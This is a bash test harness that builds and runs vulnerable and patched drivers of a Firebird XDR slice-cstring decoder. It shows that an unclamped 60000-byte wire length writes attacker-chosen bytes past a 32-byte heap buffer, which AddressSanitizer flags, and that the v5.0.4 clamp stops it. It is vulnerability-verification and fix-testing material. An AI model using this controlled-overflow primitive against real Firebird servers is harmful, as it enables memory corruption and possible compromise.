#!/usr/bin/env bash
# Source-bound Firebird XDR slice-cstring harness.
# All inputs are local argv values standing in for a slice wire length and
# descriptor; no Firebird server, socket or external system is contacted.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ulimit -c 0 2>/dev/null || true
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)

pass=0; fail=0
check() {
    if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass + 1));
    else echo "FAIL $1"; fail=$((fail + 1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }
yes() { contains "$1" "$2" && echo 1 || echo 0; }

python3 gen_driver.py > "$OUT/gen.log" || exit 2
for t in vuln fixed vuln_asan fixed_asan; do
    src=driver_${t%_asan}.cpp
    case "$t" in
        *_asan) g++ -std=gnu++11 -g -O0 -fsanitize=address -fno-omit-frame-pointer \
                    "$src" -o "$OUT/$t" || exit 2 ;;
        *)      g++ -std=gnu++11 -g -O0 "$src" -o "$OUT/$t" || exit 2 ;;
    esac
done
V="$OUT/vuln"; F="$OUT/fixed"; VA="$OUT/vuln_asan"; FA="$OUT/fixed_asan"
HUGE=60000   # 16-bit wire length, far beyond a 32-byte cstring descriptor
OK=31        # dsc_length - 1, the fixed clamp

# Rung 1: the wire length reaches xdr_opaque unclamped on XDR_DECODE.
r1=$($V collab $HUGE 32 65)
echo "$r1"
check "rung1 wire length not clamped" \
    "$(yes 'rv=1 dlen=32 wire_n=60000 copy_len=60000' "$r1")"

# Rung 2: chosen wire bytes land far past the 32-byte descriptor buffer.
ok=0
contains 'actual40=4142434441424344' "$r1" &&
contains 'actual100=4142434441424344414243444142434441424344414243444142434441424344' "$r1" && ok=1
check "rung2 chosen bytes at OOB offsets" "$ok"

# Rung 3: ASan traps the verbatim xdr_opaque statement in the v5.0.3 source.
"$VA" exact $HUGE 32 65 > "$OUT/asan.log" 2>&1
ac=$(cat "$OUT/asan.log")
ok=0
contains 'heap-buffer-overflow' "$ac" &&
contains 'WRITE of size 60000' "$ac" &&
contains 'xdr_v5.0.3:216' "$ac" && ok=1
check "rung3 ASan write at pinned v5.0.3:216" "$ok"

# Rung 4: a different chosen seed reads back byte-exact in the OOB region.
r4=$($V collab $HUGE 32 90)
echo "$r4"
ok=0
contains 'actual40=5a5b5c5d5a5b5c5d' "$r4" &&
contains 'actual100=5a5b5c5d5a5b5c5d5a5b5c5d5a5b5c5d5a5b5c5d5a5b5c5d5a5b5c5d5a5b5c5d' "$r4" && ok=1
check "rung4 chosen 0x5a bytes at OOB offsets" "$ok"

# Guard page: the first past-end store crosses into PROT_NONE.
( "$V" guard $HUGE 32 65 > "$OUT/guard.log" 2>&1 )
grc=$?
check "guard page fault on first past-end write" "$([ "$grc" -eq 139 ] && echo 1 || echo 0)"

# Fixed v5.0.4 clamps to dsc_length - 1; benign traffic is unchanged.
fc=$($F collab $HUGE 32 65)
check "fixed clamps hostile wire length" \
    "$(yes 'rv=1 dlen=32 wire_n=60000 copy_len=31' "$fc")"
fg=$($F collab $OK 32 65)
check "fixed accepts benign wire length" \
    "$(yes 'rv=1 dlen=32 wire_n=31 copy_len=31' "$fg")"

"$FA" exact $HUGE 32 65 > "$OUT/fixed_asan_bad.log" 2>&1
"$FA" exact $OK 32 65 > "$OUT/fixed_asan_good.log" 2>&1
fb=$(cat "$OUT/fixed_asan_bad.log")
fgo=$(cat "$OUT/fixed_asan_good.log")
ok=0
! contains 'AddressSanitizer' "$fb" && ! contains 'AddressSanitizer' "$fgo" && ok=1
check "fixed ASan clean on hostile and benign" "$ok"
vgr=$($VA exact $OK 32 65 2>&1)
ok=0
! contains 'AddressSanitizer' "$vgr" && contains 'rv=1' "$vgr" && ok=1
check "vulnerable ASan clean on benign wire length" "$ok"

# Determinism: two independent five-run groups, chosen bytes and pinned line.
group() {
    for i in 1 2 3 4 5; do
        "$V" collab $HUGE 32 65
        "$VA" exact $HUGE 32 65 2>&1 | grep -E 'ERROR: AddressSanitizer|xdr_v5.0.3:216' | head -2
        "$F" collab $HUGE 32 65
    done | grep -v -E '0x[0-9a-f]+|pid=|SUMMARY: AddressSanitizer' \
        | sha256sum | cut -d' ' -f1
}
h1=$(group); h2=$(group)
echo "sha256=$h1 sha256_b=$h2 (two independent 5-run groups)"
check "determinism two 5-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
